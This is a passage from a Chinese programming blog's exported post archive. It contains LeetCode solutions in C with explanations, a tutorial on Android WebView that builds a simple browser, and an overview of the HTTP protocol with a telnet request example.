= digitSquareSum(fast); //前进两步，即计算两次 fast = digitSquareSum(fast); &#125; while(slow != fast); //直到两者相等 if (slow == 1) return 1; //判断最终结果是否为1 else return 0;&#125; 这个问题的关键是如何结束一个潜在的无限循环，下面给出别人的更高效的方法，确实很不错。上面说到：所有不快乐数的数位平方和计算，最后都会进入4 → 16 → 37 → 58 → 89 → 145 → 42 → 20 → 4的周期性循环。因此，一旦出现2或4，那就可以判断为非快乐数但是下面带给出的是小于5，等与1时肯定是快乐数，2和4肯定不是快乐数，但是3还不确定，不明白作者为什么这么写。 12345678910111213141516171819202122public class Solution &#123; public boolean isHappy(int n) &#123; if ( n &lt; 5) &#123; //结束的条件 if (1 == n) return true; else return false; &#125; int sum = 0; // 得到各个位的数的平方和 while ( n &gt;= 10) &#123; sum += (n % 10) * (n % 10); n = n / 10; &#125; sum += n * n; return isHappy(sum); //递归调用 &#125;&#125; Remove ElementLeetCode第27题 题目描述Given an array and a value, remove all instances of that value in place and return the new length. Do not allocate extra space for another array, you must do this in place with constant memory. The order of elements can be changed. It doesn’t matter what you leave beyond the new length. 思路分析删除数组中的指定元素，可以从头到尾遍历数组，判断是否等于目标数，如果不等于，则将其移到数组的前面。 例如： 数组nums为[1,2,2,3,2,4]，要删除的数为2 i=0，nums[0]不等于2，则有nums[0] = nums[0]; 数组为[1,2,2,3,2,4]，len=1 i=1，nums[1]等于2，继续下一次循环 i=2，nums[2]等于2，继续下一次循环 i=3，nums[3]不等于2，则有nums[1] = nums[3]; 数组为[1,3,2,3,2,4]，len=2 i=4，nums[4]等于2，继续下一次循环 i=5，nums[5]不等于2，则有nums[2] = nums[5]; 数组为[1,3,4,3,2,4]，len=3 返回len即可，数组的前len个数即为删除指定元素剩余的数组元素。 LeetCode AC的代码1234567891011int removeElement(int* nums, int numsSize, int val) &#123; int len = 0,i; for(i=0;i&lt;numsSize;i++)&#123; //遍历数组 if(nums[i] != val) //如果不等于目标数 &#123; nums[len] = nums[i]; //依次移到数组前端 len++; //记录不等于目标数的个数 &#125; &#125; return len;&#125; Delete Node in a Linked ListLeetCode第237题 题目描述Write a function to delete a node (except the tail) in a singly linked list, given only access to that node. Supposed the linked list is 1 -&gt; 2 -&gt; 3 -&gt; 4 and you are given the third node with value 3, the linked list should become 1 -&gt; 2 -&gt; 4 after calling your function. Subscribe to see which companies asked this question 思路分析要删除链表中指定的节点，可以用一个指针指向要删除结点的下一个结点，然后将指针指向的结点的数据域和指针域复制给要删除的结点，再释放掉指针指向的结点，这样就从链表中成功删除了该结点。 LeetCode AC的代码12345678910111213/** * Definition for singly-linked list. * struct ListNode &#123; * int val; * struct ListNode *next; * &#125;; */void deleteNode(struct ListNode* node) &#123; struct ListNode* p = node-&gt;next; //指向要删除结点的下一个结点 node-&gt;val = p-&gt;val; //把下一个结点的数据域复制给要删除的结点 node-&gt;next = p-&gt;next; //把下一个结点的指针域复制给要删除的结点 free(p); //释放下一个结点&#125; Count PrimesLeetCode第204题 题目描述Description: Count the number of prime numbers less than a non-negative number, n. 思路分析素数是指除了1和它本身以外,不能被任何整数整除的数。这是一个很老但是很经典的问题，大一的时候就遇到过这个问题，那时候只要求做出来并不没有时间复杂度等要求，但是这个题目不一样。题目要求统计小于n的数中素数的个数，方法多种，但是如果使用最原始的方法一般都会超时的，所以需要一个高效的办法来解决这个问题。 （1）基本思路（提交时超时）： 123456789101112int countPrimes(int n) &#123; int i,j,cnt=0; for(i=2;i&lt;n;i++)&#123; for(j=2;j&lt;=sqrt(i);j++)&#123; //和比它的平方根小的数相除 if(i%j==0) //如果除尽了是合数 break; &#125; if(j&gt;sqrt(i)) //如果都不能除尽则是素数 cnt++; &#125; return cnt;&#125; （2）利用数学规律解题 素数出现规律：当n≧5时，如果n为素数，那么n mod 6 = 1 或 n mod 6 = 5，即n一定出现在6x（x≥1）两侧。 可以参考这篇博客：高效判断素数方法 LeetCode AC的代码(1)12345678910111213141516171819202122bool isPrime(int num) &#123; int i; if(num == 2 || num == 3) return true; if (num % 6 != 1 &amp;&amp; num % 6 != 5) return false; for (i=5;i*i&lt;=num;i+=6) &#123; if(num%i == 0 || num%(i+2) == 0) return false; &#125; return true; &#125;int countPrimes(int n) &#123; int i,j,cnt=0; for(i=2;i&lt;n;i++)&#123; if(isPrime(i)) cnt++; &#125; return cnt;&#125; （3）改进方法 定义一个n个数大小的数组，并全部初始化为0,从2开始判断，如果这个数为0，则将他的倍数都标记为1，比如将2的倍数4，6，8…等都标记为1，然后3的倍数6，9，12…都标记为1，最后统计遍历这些数的过程中为等于0的次数。 LeetCode AC的代码(2)12345678910111213int countPrimes(int n) &#123; int i,j,cnt=0; int *prime; prime = (int *)malloc(sizeof(int)*n); //分配内存空间 for(i=2;i&lt;n;i++)&#123; //遍历小于n的数 if(prime[i] == 0)&#123; //如果这个数为0 cnt++; //记录加1 for(j=2;i*j&lt;n;j++) //将这个数的倍数都标记为1 prime[i*j] = 1; &#125; &#125; return cnt;&#125;]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android WebView详解]]></title>
    <url>%2F2016%2F08%2F26%2FAndroid-WebView%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Android提供了内置的浏览器，该浏览器使用了开源的WebKit引擎，要使用内置的浏览器就需要通过WebView来实现。Android WebView在Android平台上是一个特殊的View， 它能用来显示网页，这个类可以被用来在你的app中仅仅显示一张在线的网页，还可以用来开发浏览器。本文详细介绍了WebView的相关方法以及配置操作，最后通过一个简易的浏览器对WebView进行应用演示。 基本使用基本方法 方法 描述 loadUrl(String url) 用于加载指定url对应得网页 goBack() 执行后退操作，相当于浏览器的回退按钮功能 goForward() 执行前进操作，相当于浏览器的前进按钮功能 stopLoading() 用于停止加载当前页面 reload() 用于刷新当前页面 使用示例访问百度首页： 12mWebView = (WebView) findViewById(R.id.webView1);mWebView.loadUrl(&quot;http://www.baidu.com/&quot;); 这个时候发现一个问题，启动应用后，自动的打开了系统内置的浏览器，解决这个问题需要为webview设置WebViewClient，并重写重写WebViewClient的shouldOverrideUrlLoading方法返回true，这样新的连接就会在当前WebView中打开。 1234567mWebView.setWebViewClient(new WebViewClient()&#123; @Override public boolean shouldOverrideUrlLoading(WebView view, String url)&#123; view.loadUrl(url); return true; &#125;&#125;); 进阶使用WebSettings常用方法获取设置WebView的WebSettings对象。 1mWebView.getSettings() //得到WebSettings对象 （1）设置支持自动加载图片 1mWebView.getSettings().setLoadsImagesAutomatically(true); （2）设置支持放大和缩小的功能 12mWebView.getSettings().setSupportZoom(true); mWebView..getSettings().setBuiltInZoomControls(true) （3）设置支持多窗口 1mWebView.getSettings().supportMultipleWindows(); （4） 设置支持JavaScript 1mWebView.getSettings().setJavaScriptEnabled(true); （5）设置将图片调整到适合webview的大小 1mWebView.getSettings().setUseWideViewPort(false); （6）设置支持插件 1mWebView.getSettings().setPluginsEnabled(true); WebViewClient常用方法设置将接收各种通知和请求的WebViewClient。 123mWebView.setWebViewClient(new WebViewClient()&#123; //可在此重写下列方法，以实现相应需求&#125;); （1）开始载入页面时调用 1onPageStarted(WebView view, String url, Bitmap favicon) （2）在页面加载结束时调用 1onPageFinished(WebView view, String url) （3）在加载页面资源时调用 1onLoadResource(WebView view, String url) （4）报告错误信息1onReceivedError(WebView view, int errorCode, String description, String failingUrl) （5）重写此方法才能够处理在浏览器中的按键事件 1shouldOverrideKeyEvent(WebView view, KeyEvent event) （6）控制新的连接在当前WebView中打开 1shouldOverrideUrlLoading(WebView view, String url) WebChromeClient常用方法设置chrome处理。 123mWebView.setWebChromeClient(new WebChromeClient() &#123; //可在此重写下列方法，以实现相应需求&#125;); （1）网页加载进度改变时调用 1onProgressChanged(WebView view, int newProgress) （2）网页加载完毕时获取网站标题 1onReceivedTitle(WebView view, String title) （3）创建WebView时 1onCreateWindow(WebView view, boolean isDialog,boolean isUserGesture, Message resultMsg) （4）关闭WebView时 1onCloseWindow(WebView window) （5）网页加载完毕时获取网站图标 1onReceivedIcon(WebView view, Bitmap icon) （6）WebView获得焦点时 1onRequestFocus(WebView view) 浏览器开发小技巧（1）设置android WebView 不显示滚动条 可以直接在layout中添加如下属性设置 1android:scrollbars=&quot;none&quot; （2）一些清除方法 1234mWebView.clearHistory(); //清除当前webview访问的历史记录mWebView.clearFormData(); //清除自动完成填充的表单数据mWebView.clearCache(); //清除网页访问留下的缓存mWebView.clearMatches(); //清除网页查找的高亮匹配字符 自制简易浏览器带前进、后退、主页、刷新按钮，网页加载进度条，网址输入框的简单浏览器。 实现效果如下： 添加网络访问权限1&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt; MainActivity.java123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113public class MainActivity extends Activity implements OnClickListener &#123; private WebView mWebView; private ImageButton mBack, mHome, mNext, mRefresh; private EditText mEditText; private ProgressBar mProgressBar; private String homeUrl = &quot;www.baidu.com&quot;; @SuppressLint(&quot;SetJavaScriptEnabled&quot;) @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); requestWindowFeature(Window.FEATURE_NO_TITLE); setContentView(R.layout.activity_main); mWebView = (WebView) findViewById(R.id.wb_test_web); mBack = (ImageButton) findViewById(R.id.ib_back); //返回按钮 mHome = (ImageButton) findViewById(R.id.ib_home); //主页按钮 mNext = (ImageButton) findViewById(R.id.ib_next); //前进按钮 mRefresh = (ImageButton) findViewById(R.id.ib_refresh); //刷新按钮 mEditText = (EditText) findViewById(R.id.et_url); //网址输入框 mProgressBar = (ProgressBar) findViewById(R.id.pb_load); //网页加载进度条 /*设置监听事件*/ mBack.setOnClickListener(this); mHome.setOnClickListener(this); mNext.setOnClickListener(this); mRefresh.setOnClickListener(this); mEditText.setOnClickListener(this); /*WebView的基本设置*/ mWebView.getSettings().setJavaScriptEnabled(true); mWebView.getSettings().setSupportZoom(true); mWebView.getSettings().setBuiltInZoomControls(true); mWebView.setInitialScale(25); mWebView.getSettings().setUseWideViewPort(true); mWebView.setWebViewClient(new WebViewClient()); mWebView.setWebChromeClient(new WebChromeClient() &#123; @Override public void onProgressChanged(WebView view, int newProgress) &#123; // TODO Auto-generated method stub mProgressBar.setProgress(newProgress); //设置进度 System.out.println(newProgress); if (newProgress == 100) &#123; mProgressBar.setVisibility(View.GONE); //加载完后设置进度条不可见 &#125;else&#123; mProgressBar.setVisibility(View.VISIBLE); //设置进度条可见 &#125; super.onProgressChanged(view, newProgress); &#125; @Override public void onReceivedTitle(WebView view, String title) &#123; // TODO Auto-generated method stub mEditText.setText(title); //网站加载完后， super.onReceivedTitle(view, title); &#125; &#125;); /*加载主页*/ loadWeb(homeUrl); mEditText.setOnKeyListener(new OnKeyListener() &#123; @Override public boolean onKey(View v, int keyCode, KeyEvent event) &#123; // TODO Auto-generated method stub String url = mEditText.getText().toString(); if (keyCode == KeyEvent.KEYCODE_ENTER) &#123; if (!url.equals(&quot;&quot;)) &#123; loadWeb(url); return true; &#125; &#125; else &#123; Toast.makeText(MainActivity.this, &quot;请输入要访问的网址&quot;, Toast.LENGTH_SHORT).show(); &#125; return false; &#125; &#125;); &#125; public void loadWeb(String url) &#123; url = &quot;http://&quot; + url; //补全url mWebView.loadUrl(url); //加载页面 &#125; @Override public void onClick(View v) &#123; // TODO Auto-generated method stub switch (v.getId()) &#123; case R.id.ib_back: mWebView.goBack(); //返回上一个页面 break; case R.id.ib_home: loadWeb(homeUrl); //回到主页 break; case R.id.ib_next: mWebView.goForward(); //前进到下一个页面 break; case R.id.ib_refresh: mWebView.reload(); //重新加载 break; case R.id.et_url: mEditText.setText(&quot;&quot;); //输入网站 mEditText.setHint(&quot;请输入网址&quot;); break; default: break; &#125; &#125;&#125;]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,Webview］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android网络编程：HTTP协议]]></title>
    <url>%2F2016%2F08%2F22%2FAndroid%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%EF%BC%9AHTTP%E5%8D%8F%E8%AE%AE%2F</url>
    <content type="text"><![CDATA[HTTP协议是一个基于请求与响应模式的、无状态的、应用层的协议，常基于TCP的连接方式，HTTP1.1版本中给出一种持续连接的机制，绝大多数的Web开发，都是构建在HTTP协议之上的Web应用。在之前的博客中多次使用HTTP网络请求，了解HTTP协议的详细工作过程以及报文格式，对于深入理解Android网络编程具有重要的意义。此篇博文通过搜集网络上优秀的博客文章，对HTTP协议的内容进行了较为详细的总结。 HTTP协议（HyperText Transfer Protocol，超文本传输协议）是用于从WWW服务器传输超文本到本地浏览器的传送协议。它可以使浏览器更加高效，使网络传输减少。它不仅保证计算机正确快速地传输超文本文档，还确定传输文档中的哪一部分，以及哪部分内容首先显示(如文本先于图形)等。 HTTP工作流程HTTP协议永远都是客户端发起请求，服务器回送响应。见下图： 这样就限制了使用HTTP协议，无法实现在客户端没有发起请求的时候，服务器将消息推送给客户端。 HTTP协议是一个无状态的协议，同一个客户端的这次请求和上次请求是没有对应关系。 一次HTTP操作称为一个事务，其工作过程可分为四步： （1）首先客户机与服务器需要建立连接。只要单击某个超级链接，HTTP的工作开始。 （2）建立连接后，客户机发送一个请求给服务器，请求方式的格式为：统一资源标识符（URL）、协议版本号，后边是MIME信息包括请求修饰符、客户机信息和可能的内容。 （3）服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是MIME信息包括服务器信息、实体信息和可能的内容。 （4）客户端接收服务器所返回的信息通过浏览器显示在用户的显示屏上，然后客户机与服务器断开连接。 如果在以上过程中的某一步出现错误，那么产生错误的信息将返回到客户端，有显示屏输出。对于用户来说，这些过程是由HTTP自己完成的，用户只要用鼠标点击，等待信息显示就可以了。 HTTP URL的格式1http://host[&quot;:&quot;port][abs_path] http表示通过HTTP协议来定位网络资源 host表示合法的Internet主机域名或者ip地址 port指定一个端口号，为空则使用默认端口80 abs_path指请求资源的URL HTTP请求报文HTTP请求由四部分组成，分别是：请求行、请求报头、空行、请求数据 请求行请求行格式： 1方法 请求的URL 版本 回车换行 HTTP请求方法： HTTP请求方法有8种，分别是GET、POST、PUT、DELETE、HEAD、OPTIONS、TRACE、CONNECT 。 GET：GET的本质就是发送一个请求来取得服务器上的某一资源。资源通过一组HTTP头和呈现数据（如HTML文本，或者图片或者视频等）返回给客户端。 POST：向服务器提交数据。这个方法用途广泛，几乎目前所有的提交操作都是靠这个完成。 PUT：本质上来讲， PUT和POST极为相似，都是向服务器发送数据，但它们之间有一个重要区别，PUT通常指定了资源的存放位置，而POST则没有，POST的数据存放位置由服务器自己决定。 DELETE：请求服务器删除请求的URI所标识的资源。 HEAD：HEAD和GET本质是一样的，区别在于HEAD不含有呈现数据，而仅仅是HTTP头信息。有的人可能觉得这个方法没什么用，其实不是这样的。想象一个业务情景：欲判断某个资源是否存在，我们通常使用GET，但这里用HEAD则意义更加明确。 OPTIONS：它可以用来获取服务器支持的HTTP请求方法，还可以用来用来检查服务器的性能。它对于服务端和用户端一定是安全的。 TRACE 请求服务器回送收到的请求信息，主要用于测试或诊断 CONNECT 保留将来使用 请求报头在请求行之后会有0个或者多个请求报头，每个请求报头都由关键字/值对组成，每行一对，关键字和值用英文冒号“:”分隔。 请求报头通知服务器关于客户端求求的信息，典型的请求头有： Host：请求的主机名，允许多个域名同处一个IP地址，即虚拟主机 User-Agent：发送请求的浏览器类型、操作系统等信息 Accept：客户端可识别的内容类型列表，用于指定客户端接收那些类型的信息 Accept-Encoding：客户端可识别的数据编码 Accept-Language：表示浏览器所支持的语言类型 Connection：允许客户端和服务器指定与请求/响应连接有关的选项，例如设置为Keep-Alive则表示保持连接。 Transfer-Encoding：告知接收端为了保证报文的可靠传输，对报文采用了什么编码方式。 空行最后一个请求头之后是一个空行，发送回车符和换行符，通知服务器以下不再有请求头。 请求数据请求数据不在GET方法中使用，而是在POST方法中使用。POST方法适用于需要客户填写表单的场合，与请求数据相关的最常用的请求头是Content-Type和Content-Length。 HTTP响应报文HTTP响应也由四部分组成，分别是：状态行、响应报头、空行、响应数据 状态行状态行格式： 1版本 状态码 原因短语 回车换行 HTTP协议响应状态码： HTTP协议响应状态码由三位数字组成，第一个数字定义了响应的类别，且有五种可能取值： 1xx：指示信息–表示请求已接收，继续处理 2xx：成功–表示请求已被成功接收、理解、接受 3xx：重定向–要完成请求必须进行更进一步的操作 4xx：客户端错误–请求有语法错误或请求无法实现 5xx：服务器端错误–服务器未能实现合法的请求 常见状态代码、状态描述、说明： 200 OK 客户端请求成功 304 NOT MODIFIED 未修改；一般浏览器会缓存一些数据，当下次请求时将发送Etag与Last_Modified信息给服务器确定是否次文件在服务器修改过，若果是将重新加载 400 Bad Request 客户端请求有语法错误，不能被服务器所理解 401 Unauthorized 请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用 403 Forbidden 服务器收到请求，但是拒绝提供服务 404 Not Found 请求资源不存在，eg：输入了错误的URL 500 Internal Server Error 服务器发生不可预期的错误 503 Server Unavailable 服务器当前不能处理客户端的请求，一段时间后可能恢复正常 响应报头用于服务器传递自身信息的响应，常见的响应报头： Location：用于重定向接受者到一个新的位置，常用在更换域名的时候Server：包含可服务器用来处理请求的系统信息，与User-Agent请求报头是相对应的 响应数据服务器根据发送的请求返回的数据 HTTP报头HTTP报头分为通用报头，请求报头，响应报头和实体报头。 请求方的http报头结构：通用报头|请求报头|实体报头 响应方的http报头结构：通用报头|响应报头|实体报头 请求报头与响应报头在前文已经详细描述，下文主要讲解通用报头和实体报头。 通用报头既可以出现在请求报头，也可以出现在响应报头中 Date：表示消息产生的日期和时间 Connection：允许发送指定连接的选项，例如指定连接是连续的，或者指定“close”选项，通知服务器，在响应完成后，关闭连接 Cache-Control：用于指定缓存指令，缓存指令是单向的（响应中出现的缓存指令在请求中未必会出现），且是独立的（一个消息的缓存指令不会影响另一个消息处理的缓存机制） 实体报头实体报头用来定于被传送资源的信息，既可以用于请求也可用于响应。请求和响应消息都可以传送一个实体，常见的实体报头为： Content-Type：发送给接收者的实体正文的媒体类型 Content-Lenght：实体正文的长度 Content-Language：描述资源所用的自然语言，没有设置则该选项则认为实体内容将提供给所有的语言阅读 Content-Encoding：实体报头被用作媒体类型的修饰符，它的值指示了已经被应用到实体正文的附加内容的编码，因而要获得Content-Type报头域中所引用的媒体类型，必须采用相应的解码机制。 Last-Modified：实体报头用于指示资源的最后修改日期和时间 Expires：实体报头给出响应过期的日期和时间 请求示例Windows下使用cmd的telnet命令模拟HTTP请求 打开命令提示符输入以下内容，建立连接1telnet blog.line-coding.tech 80 HTTP默认使用80端口，HTTPS默认使用443.此示例是对我的博客的一个404页面发送一个GET请求，所以请求地址为blog.line-coding.tech。 输入上面的命令回车之后就会进入命令界面，可以输入请求信息，也可以通过使用快捷键”Ctrl+](右中括号)”来打开本地回显功能查看自己输入的内容，在本地回显界面再按下回车就可以进入命令界面编辑请求信息。 输入请求头信息1234567GET / HTTP/1.1HOST:blog.line-coding.techUser-Agent:Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36Accept:*/*Accept-Encoding:gzip, deflate, sdchAccept-Language:zh-CNConnection:keep-alive 按两下回车键得到响应信息第一个回车代表请求头结束的空行，第二个回车代表请求数据为空并发送请求 结果如下： 红色箭头指示为我们输入的请求头，蓝色箭头指示的为响应报文的内容，下面还有一些内容就是响应数据。 参考文章： 1、《网络协议》HTTP 协议：http://blog.csdn.net/chenhanzhun/article/details/43149557 2、http协议学习系列：http://www.blogjava.net/zjusuyong/articles/304788.html 3、通过win7中cmd命令提示符telnet模拟http请求：http://blog.csdn.net/hsd2012/article/details/51075811]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,网络,Http］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(六)]]></title>
    <url>%2F2016%2F08%2F21%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E5%85%AD%2F</url>
    <content type="text"><![CDATA[Valid AnagramLeetCode第242题 题目描述Given two strings s and t, write a function to determine if t is an anagram of s. For example,s = “anagram”, t = “nagaram”, return true.s = “rat”, t = “car”, return false. Note:You may assume the string contains only lowercase alphabets. 思路分析先将两个字符串按字母大小排序，再从头开始比较每一个字符，如果全相等则是，否则不是。这个方法可以得到结果，但是效率太低，字符串很长时会造成超时。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define true 1#define false 0char* sort(char *s,int len) //简单选择排序&#123; int i,j,min,temp; for(i=0;i&lt;len-1;i++) &#123; min = i; for(j=i+1;j&lt;len;j++) &#123; if(s[j]&lt;s[min]) min = j; &#125; if(min!=i) &#123; temp = s[i]; s[i] = s[min]; s[min] = temp; &#125; &#125; return s;&#125;int isAnagram(char* s, char* t) &#123; //判断字符串是否相等 int len1,len2,i; len1 = strlen(s); len2 = strlen(t); if(len1 == len2) &#123; s = sort(s,len1); t = sort(t,len2); for(i=0;i&lt;len1;i++) //从第一个字符开始按顺序判断每个字符是否相等 &#123; if(s[i] == t[i]) continue; else return false; &#125; if(i==len1) //如果全相等，则返回真 return true; &#125; else return false;&#125;int main()&#123; char s[100],t[100]; gets(s); //输入两个字符串 gets(t); if(isAnagram(s,t)) printf(&quot;YES!\n&quot;); else printf(&quot;NO!\n&quot;); return 0;&#125; 更好的解法26个字母，用一个数组来记录每个字母出现的次数，如果某个字母在第一个数组出现，它第二个数组中出现时则计数减一，最好判断计数数组是否全为0。 1234567891011121314151617181920212223242526bool isAnagram(char* s, char* t) &#123; int scnt = 0; int tcnt = 0; int i; int histogram[26] = &#123;0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0&#125;; //初始化记录数组 while(s[scnt] != &apos;\0&apos;)&#123; histogram[s[scnt] - 97]++; //对应记录值加一 scnt++; &#125; while(t[tcnt] != &apos;\0&apos;)&#123; histogram[t[tcnt] - 97]--; //对应记录值减一 tcnt++; &#125; if(scnt != tcnt) return false; else if(scnt == 0) return true; else&#123; for(i = 0; i &lt; 26 ; i++) if(histogram[i] != 0) return false; //判断所有记录值是不是都为0 return true; &#125;&#125; 终极解决办法从两个字符串第一个字符开始，依次记录两个字符串的对应字符的ASCLL码的差值，如果最后得到的记录值为0，则说明两个字符串中含有的字符完全相同，否则不相同。 12345678910111213141516bool isAnagram(char* s, char* t) &#123; int total = 0; if(strlen(s)!=strlen(t)) //如果字符串长度不相等则无须比较 return false;//按顺序遍历两个字符串，用total来记录两个字符串中字符的ascll码值差值，如果最后差值等与0，则可判断为字符相等，否则不想等。 while((*s)!=&apos;\0&apos;) &#123; total += (*s-*t); s++; t++; &#125; if(total==0) return true; else return false;&#125; 超简洁的python实现1return sorted(s) == sorted(t) Add DigitsLeetCode第258题 题目描述Given a non-negative integer num, repeatedly add all its digits until the result has only one digit. For example: Given num = 38, the process is like: 3 + 8 = 11, 1 + 1 = 2. Since 2 has only one digit, return it. Follow up: Could you do it without any loop/recursion in O(1) runtime? //这个要求好像没达到，但是还是AC了 思路分析对取余得到数的各个位的数值，然后加起来，得到一个新的数，判断这个新的数是否还可以进行上述步骤，即判断该数是否大于10，如果大于10则递归执行上述操作，否则该数即为我们需要的结果。 LeetCode AC的代码1234567891011int addDigits(int num) &#123; int sum=0; while(num)&#123; //求各个位的值的和 sum = sum + num%10; num = num/10; &#125; if(sum&gt;=10) return addDigits(sum); //递归执行 else return sum;&#125; Two SumLeetCode第1题 题目描述Given an array of integers, return indices of the two numbers such that they add up to a specific target. You may assume that each input would have exactly one solution. Example: Given nums = [2, 7, 11, 15], target = 9, Because nums[0] + nums[1] = 2 + 7 = 9,return [0, 1]. 思路分析给了一个数组，然后给一个目标数，找出目标数是由数组中哪两个数相加得到的，输出那两个数的下标。我们只要从第一个数开始将每个数与后面的数依次相加并判断相加的结果是否等于目标数 一定要注意代码编辑部分的提示，返回的数组必须自己使用malloc分配内存，否则即使你做对了也一直无法AC，这就是我的惨痛教训！ LeetCode AC的代码1234567891011121314151617181920/** * Note: The returned array must be malloced, assume caller calls free(). */int* twoSum(int* nums, int numsSize, int target) &#123; int i,j,*res; res = (int *)malloc(sizeof(int)*2); for(i=0;i&lt;numsSize-1;i++) //从第一个数开始将每个数与后面的数依次相加 &#123; for(j=i+1;j&lt;numsSize;j++) &#123; if(nums[i] + nums[j] == target) //判断相加的结果是否等于目标数 &#123; res[0] = i; res[1] = j; return res; &#125; &#125; &#125; return res;&#125; Palindrome NumberLeetCode第9题 题目描述Determine whether an integer is a palindrome. Do this without extra space. 思路分析“回文”是指正读反读都能读通的句子，在数学中也有这样一类数字有这样的特征，成为回文数（palindrome number） 判断一个数是不是回文数，只要回文数是否与其倒置后的数相等 例如： 123倒置后为321，不是回文数 12344321倒置后仍为12344321，即为回文数 LeetCode AC的代码1234567891011121314151617bool isPalindrome(int x) &#123; int mod,inverse=0,num; if(x&lt;0) //负数必定不是回文数 return false; num = x; while(num) //把数倒置 &#123; mod = num%10; inverse = inverse*10 + mod; num = num/10; &#125; if(inverse==x) //判断原数与倒置后的数是否相等 return true; else return false; return true;&#125; Excel Sheet Column TitleLeetCode第168题 题目描述Given a positive integer, return its corresponding column title as appear in an Excel sheet. For example: 12345671 -&gt; A2 -&gt; B3 -&gt; C...26 -&gt; Z27 -&gt; AA28 -&gt; AB LeetCode AC的代码1234567891011121314151617181920212223char* convertToTitle(int n) &#123; int i=0,j; char *s,temp; s = (char *)malloc(sizeof(char)*100); while(n) &#123; s[i] = (char)((n-1)%26+65); n = (n-1)/26; i++; &#125; s[i]=&apos;\0&apos;; if(i&gt;1)&#123; for(j=0;j&lt;i/2;j++) &#123; temp = s[j]; s[j] = s[i-1-j]; s[i-1-j] = temp; &#125; &#125; return s;&#125;]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(五)]]></title>
    <url>%2F2016%2F08%2F18%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E4%BA%94%2F</url>
    <content type="text"><![CDATA[Move ZeroesLeetCode第283题 题目描述Given an array nums, write a function to move all 0’s to the end of it while maintaining the relative order of the non-zero elements. For example, given nums = [0, 1, 0, 3, 12], after calling your function, nums should be [1, 3, 12, 0, 0]. Note: 1、You must do this in-place without making a copy of the array. 2、Minimize the total number of operations. 思路分析题目要求把数组中的0移到数组后面去，主要是需要考虑全0、前面几个连续的0、已经是只有后面有0的情况，一开始抓着0来做，后来发现找非0的数会更方便一点，将非0的数依次前移，然后将后面的空位全部补0就可以完成任务了。 LeetCode AC的代码123456789101112void moveZeroes(int* nums, int numsSize) &#123; int i,j,m=0; for(i=0;i&lt;numsSize;i++) &#123; if(nums[i] != 0) nums[m++] = nums[i]; //将不为0的数前移 &#125; for(j=m;j&lt;numsSize;j++) //将后面空出的位置补0 &#123; nums[j] = 0; &#125;&#125; Problem A. 众数北邮2014年研究生复试机试题 题目描述给定一个长度为N的非降数列，求数列中出现次数最多的数。如果答案不唯一，输出其中最小的数。 输入格式 输入数据第一行是一个整数T(1&lt;=T&lt;=100)，表示测试数据的组数。注意各组测试数据是相互独立的。 对于每组测试数据： 第一行是一个正整数N（1&lt;=N&lt;=100），表示数列长度。 第二行有N个正整数，整数之间用空格隔开，所有的整数都不超过10的5次方 ，表示这个数列。 输出格式 对于每组测试数据，输出一个整数。 输入样例 2 4 1 1 1 2 5 1 1 2 2 3 输出样例 1 1 思路分析对输入序列进行排序，然后从头开始统计相同整数的个数，将个数最多的整数输出即可。 C语言实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;char* sort(int *s,int len)&#123; //简单选择排序 int i,j,min,temp; for(i=0;i&lt;len-1;i++) &#123; min = i; for(j=i+1;j&lt;len;j++) &#123; if(s[j]&lt;s[min]) min = j; &#125; if(min!=i) &#123; temp = s[i]; s[i] = s[min]; s[min] = temp; &#125; &#125; return s;&#125;int main()&#123; int n,m,i,j,*num,count,k,result; scanf(&quot;%d&quot;,&amp;n); while(n--)&#123; scanf(&quot;%d&quot;,&amp;m); num = (int *)malloc(sizeof(int)*m); for(i=0;i&lt;m;i++) scanf(&quot;%d&quot;,&amp;num[i]); num = sort(num,m); //对输入序列进行排序 count=0; k=1; for(i=0;i&lt;m-1;i++) &#123; if(num[i] == num[i+1])&#123; k++; //如果连续的数相等，则计数加1 &#125;else&#123; k=1; //如果连续的数不相等，则计数清空 &#125; if(count&lt;k) //如果此时的统计个数大于之前的记录值则当前为最大值 &#123; count = k; //统计个数最多的数 result = num[i]; //记录个数最多的数的值 &#125; &#125; printf(&quot;%d\n&quot;,result); &#125; return 0;&#125; Ugly NumberLeetCode第263题 题目分析Write a program to check whether a given number is an ugly number. Ugly numbers are positive numbers whose prime factors only include 2, 3, 5. For example, 6, 8 are ugly while 14 is not ugly since it includes another prime factor 7. Note that 1 is typically treated as an ugly number. 思路分析把只包含因子2、3和5的数称作丑数（Ugly Number）。例如6、8都是丑数，但14不是，因为它包含因子7。习惯上我们把1当做是第一个丑数。 所谓一个数m是另一个数n的因子，是指n能被m整除，也就是n % m == 